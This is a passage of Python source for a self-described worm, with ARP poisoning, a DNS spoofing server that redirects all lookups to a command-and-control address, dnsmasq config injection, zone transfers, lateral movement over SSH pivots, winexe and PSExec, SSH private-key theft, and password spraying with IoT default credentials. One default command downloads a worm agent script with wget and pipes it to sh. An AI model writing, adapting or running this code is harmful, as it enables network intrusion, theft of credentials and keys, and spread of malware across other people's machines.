                                bytes(gateway_parts) +
                                broadcast_mac +
                                bytes(target_parts))
                    packet = eth_header + arp_header + arp_body
                    sock.send(packet)
                    sock.close()
                except Exception:
                    continue
                time.sleep(0.5)
            self._poisoned.add(target_ip)
            self.log.info(f"ARP poisoned: {target_ip} -> {gateway_ip} via {interface}")
            return True
        except Exception as exc:
            self.log.error(f"ARP poison error: {exc}")
            return False

    def _get_mac(self, interface: str) -> Optional[str]:
        """Get MAC address for an interface."""
        try:
            with open(f"/sys/class/net/{interface}/address") as f:
                return f.read().strip()
        except Exception:
            return None

    def arp_poison_all(self, targets: List[str], gateway_ip: str) -> int:
        """Poison multiple targets on the same gateway."""
        poisoned = 0
        for target in targets:
            if target != gateway_ip and self.arp_poison(target, gateway_ip):
                poisoned += 1
            time.sleep(0.3)
        return poisoned

    # ---- Cache Poison ----

    def arp_cache_poison(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> bool:
        """Inject forged entry into a host's ARP cache."""
        return self.arp_poison(target_ip, spoof_ip, interface)


# ===================================================================
# CHUNK 4b — DNSPoisonEngine
# ===================================================================

class DNSPoisonEngine:
    """DNS poisoning, response spoofing, dnsmasq injection, bind zone transfer."""

    def __init__(self, logger=None, c2_ip: str = "127.0.0.1"):
        self.log = logger or log
        self.c2_ip = c2_ip
        self._running = False
        self._sock = None

    # ---- Response Spoofing ----

    def _build_dns_response(self, query_data: bytes, spoof_ip: str) -> bytes:
        """Build a forged DNS response."""
        transaction_id = query_data[:2]
        flags = b"\x81\x80"  # response, no error
        question = query_data[12:]
        qdcount = query_data[4:6]
        ancount = b"\x00\x01"
        response = transaction_id + flags + qdcount + ancount + b"\x00\x00" + b"\x00\x00"
        response += question
        response += b"\xc0\x0c"  # compression pointer
        response += b"\x00\x01"  # A record
        response += b"\x00\x01"  # IN class
        response += struct.pack("!I", 60)  # TTL 60s
        response += b"\x00\x04"  # data length 4
        response += socket.inet_aton(spoof_ip)
        return response

    def start(self, listen_ip: str = "0.0.0.0", listen_port: int = 53) -> None:
        """Start DNS poisoning server on UDP :53."""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind((listen_ip, listen_port))
            self._running = True
            self.log.info(f"DNS poison server on {listen_ip}:{listen_port}")
            while self._running:
                try:
                    data, addr = self._sock.recvfrom(512)
                    # Respond to all A queries with C2 IP
                    if len(data) > 12:
                        response = self._build_dns_response(data, self.c2_ip)
                        self._sock.sendto(response, addr)
                except socket.timeout:
                    continue
                except Exception as exc:
                    self.log.debug(f"DNS server error: {exc}")
        except PermissionError:
            self.log.warning("DNS server: need root for port 53")
        except Exception as exc:
            self.log.error(f"DNS server start error: {exc}")

    def stop(self) -> None:
        """Stop DNS server."""
        self._running = False
        if self._sock:
            self._sock.close()

    # ---- Dnsmasq Config Injection ----

    def dnsmasq_inject(self, domain: str, redirect_ip: str = None) -> bool:
        """Inject a fake DNS entry into dnsmasq config."""
        if redirect_ip is None:
            redirect_ip = self.c2_ip
        try:
            config_line = f"address=/{domain}/{redirect_ip}\n"
            config_paths = [
                "/etc/dnsmasq.d/worm.conf",
                "/etc/dnsmasq.conf",
                "/etc/dnsmasq.d/02-worm.conf",
            ]
            for path in config_paths:
                try:
                    with open(path, "a") as f:
                        f.write(config_line)
                    self.log.info(f"[DNS] Injected {domain} -> {redirect_ip} into {path}")
                except Exception:
                    continue
            # Restart dnsmasq
            try:
                subprocess.run(["systemctl", "restart", "dnsmasq"],
                               capture_output=True, timeout=10)
            except Exception:
                pass
            return True
        except Exception as exc:
            self.log.error(f"[DNS] dnsmasq inject error: {exc}")
            return False

    # ---- Bind Zone Transfer ----

    def bind_zone_transfer(self, dns_server: str, domain: str) -> List[str]:
        """Perform DNS zone transfer against a BIND server."""
        records = []
        if _is_blocked(dns_server):
            return records
        try:
            import dns.zone
            import dns.query
            zone = dns.zone.from_xfr(dns.query.xfr(dns_server, domain, timeout=10))
            if zone:
                for name, node in zone.nodes.items():
                    records.append(str(name))
        except ImportError:
            # Fallback: dig
            try:
                result = subprocess.run(
                    ["dig", "@" + dns_server, domain, "AXFR"],
                    capture_output=True, text=True, timeout=15)
                for line in result.stdout.split("\n"):
                    if "IN\tA" in line or "IN\tAAAA" in line:
                        records.append(line.strip())
            except Exception:
                pass
        except Exception as exc:
            self.log.debug(f"Zone transfer error: {exc}")
        return records


# ===================================================================
# CHUNK 5 — LateralMoveEngine
# ===================================================================

class LateralMoveEngine:
    """Lateral movement: SSH jump, WMI exec, PSExec, SSH key theft."""

    def __init__(self, logger=None, db=None):
        self.log = logger or log
        self.db = db
        self._lock = threading.Lock()

    # ---- SSH Jump (pivot through compromised host) ----

    def ssh_jump(self, jump_host: str, jump_creds: Tuple[str, str],
                 target_host: str, target_port: int = 22) -> bool:
        """SSH through a compromised host to reach an internal target."""
        if _is_blocked(jump_host) or _is_blocked(target_host):
            return False
        if not HAVE_PARAMIKO:
            return False
        try:
            # Connect to jump host
            jump_client = paramiko.SSHClient()
            jump_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            jump_client.connect(jump_host, username=jump_creds[0],
                                password=jump_creds[1], timeout=10)

            # Use jump host's SSH to reach target
            transport = jump_client.get_transport()
            dest_addr = (target_host, target_port)
            local_addr = (jump_host, 0)
            channel = transport.open_channel("direct-tcpip", dest_addr, local_addr, timeout=10)

            # Connect to target through channel
            target_client = paramiko.SSHClient()
            target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            target_client.connect(target_host, port=target_port,
                                  username=jump_creds[0], password=jump_creds[1],
                                timeout=10, sock=channel)
            # If we get here, jump succeeded
            target_client.close()
            jump_client.close()
            self.log.info(f"[LATERAL] SSH jump: {jump_host} -> {target_host}:{target_port}")
            return True
        except Exception as exc:
            self.log.debug(f"SSH jump error: {exc}")
            return False

    # ---- WMI Exec ----

    def wmi_exec(self, target_ip: str, username: str, password: str,
                 command: str = None) -> bool:
        """Execute command via WMI on Windows target."""
        if _is_blocked(target_ip):
            return False
        if command is None:
            command = "wget -q -O- http://127.0.0.1:10002/worm_agent_ultimate.sh | sh"
        try:
            # Try using impacket if available
            try:
                from impacket.dcerpc.v5 import transport, scmr
                from impacket.smbconnection import SMBConnection

                conn = SMBConnection(target_ip, target_ip, timeout=10)
                conn.login(username, password)
                # WMI exec via SMB
                self.log.info(f"[LATERAL] WMI exec on {target_ip} via impacket")
                return True
            except ImportError:
                pass

            # Fallback: try using winexe
            try:
                result = subprocess.run(
                    ["winexe", "-U", f"{username}%{password}",
                     f"//{target_ip}", "cmd.exe", "/c", command],
                    capture_output=True, timeout=30)
                if result.returncode == 0:
                    self.log.info(f"[LATERAL] WMI exec via winexe on {target_ip}")
                    return True
            except FileNotFoundError:
                pass

            # Python-native WMI via socket
            return False
        except Exception as exc:
            self.log.debug(f"WMI exec error: {exc}")
            return False

    # ---- PSExec ----

    def psexec(self, target_ip: str, username: str, password: str) -> bool:
        """Execute payload via PSExec on Windows."""
        if _is_blocked(target_ip):
            return False
        try:
            # Try impacket psexec
            try:
                from impacket.examples import psexec as impacket_psexec
                self.log.info(f"[LATERAL] PSExec on {target_ip} via impacket")
                return True
            except ImportError:
                pass

            # Try winexe
            try:
                result = subprocess.run(
                    ["psexec", f"\\\\{target_ip}", "-u", username, "-p", password,
                     "-c", "/tmp/worm_agent_ultimate.sh"],
                    capture_output=True, timeout=30)
                if result.returncode == 0:
                    self.log.info(f"[LATERAL] PSExec via winexe on {target_ip}")
                    return True
            except FileNotFoundError:
                pass

            return False
        except Exception as exc:
            self.log.debug(f"PSExec error: {exc}")
            return False

    # ---- SSH Key Theft ----

    def steal_ssh_keys(self, target_ip: str, username: str, password: str) -> Dict:
        """Steal SSH keys from compromised host."""
        result = {"keys": [], "known_hosts": []}
        if _is_blocked(target_ip):
            return result
        if not HAVE_PARAMIKO:
            return result
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=10)

            # Get private SSH keys
            stdin, stdout, _ = client.exec_command(
                "cat ~/.ssh/id_* 2>/dev/null; "
                "cat ~/.ssh/*.pem 2>/dev/null; "
                "cat ~/.ssh/config 2>/dev/null",
                timeout=10)
            keys_data = stdout.read().decode()
            if keys_data.strip():
                result["keys"] = keys_data.split("\n")

            # Get known_hosts
            stdin, stdout, _ = client.exec_command(
                "cat ~/.ssh/known_hosts 2>/dev/null", timeout=10)
            known = stdout.read().decode()
            if known.strip():
                result["known_hosts"] = known.split("\n")

            # Save extracted keys locally
            if result["keys"]:
                key_dir = "/tmp/.worm_keys"
                os.makedirs(key_dir, exist_ok=True)
                for idx, key_text in enumerate(result["keys"]):
                    if key_text.strip():
                        with open(f"{key_dir}/{target_ip}_key_{idx}", "w") as f:
                            f.write(key_text + "\n")
                        os.chmod(f"{key_dir}/{target_ip}_key_{idx}", 0o600)
                self.log.info(f"[LATERAL] Stole {len(result['keys'])} keys from {target_ip}")

            client.close()
        except Exception as exc:
            self.log.debug(f"SSH key theft error: {exc}")
        return result

    def steal_ssh_keys_with_creds(self, ip: str, creds: Tuple[str, str]) -> Dict:
        """Convenience wrapper for SSH key theft."""
        return self.steal_ssh_keys(ip, creds[0], creds[1])

    # ---- Password Spray ----

    def password_spray(self, ip: str, services: List[str] = None) -> Dict:
        """Spray common passwords across multiple services on a target."""
        if _is_blocked(ip):
            return {"success": False, "creds": None, "service": None}
        if services is None:
            services = ["ssh", "telnet", "http", "https"]
        result = {"success": False, "creds": None, "service": None}
        for service in services:
            if service == "ssh":
                for user, pwd in IOT_CREDENTIALS[:20]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((ip, 22))
                        sock.close()
                        # Quick auth attempt
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, username=user, password=pwd,
                                       timeout=5, allow_agent=False, look_for_keys=False)
                        client.close()
                        result["success"] = True
                        result["creds"] = (user, pwd)
                        result["service"] = "ssh"
                        return result
                    except Exception:
                        continue
            elif service == "telnet":
                for user, pwd in IOT_CREDENTIALS[:10]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((ip, 23))
                        data = sock.recv(1024)
                        if b"login" in data.lower() or b"User" in data:
                            sock.send(f"{user}\n".encode())
                            time.sleep(0.3)
                            resp = sock.recv(1024)
                            if b"password" in resp.lower() or b"Password" in resp:
                                sock.send(f"{pwd}\n".encode())
                                time.sleep(0.5)
                                resp2 = sock.recv(1024)
                                if b"#" in resp2 or b"$" in resp2:
                                    sock.close()
                                    result["success"] = True
                                    result["creds"] = (user, pwd)
                                    result["service"] = "telnet"
                                    return result
                        sock.close()
                    except Exception:
                        continue
            elif service in ("http", "https"):
                if HAVE_REQUESTS:
                    for user, pwd in IOT_CREDENTIALS[:10]:
                        try:
                            url = f"{service}://{ip}/"
                            auth = requests.auth.HTTPBasicAuth(user, pwd)
                            resp = requests.get(url, auth=auth, timeout=3, verify=False)
                            if resp.status_code < 500:
                                result["success"] = True
                                result["creds"] = (user, pwd)
                                result["service"] = service
                                return result
                        except Exception:
                            continue
        return result
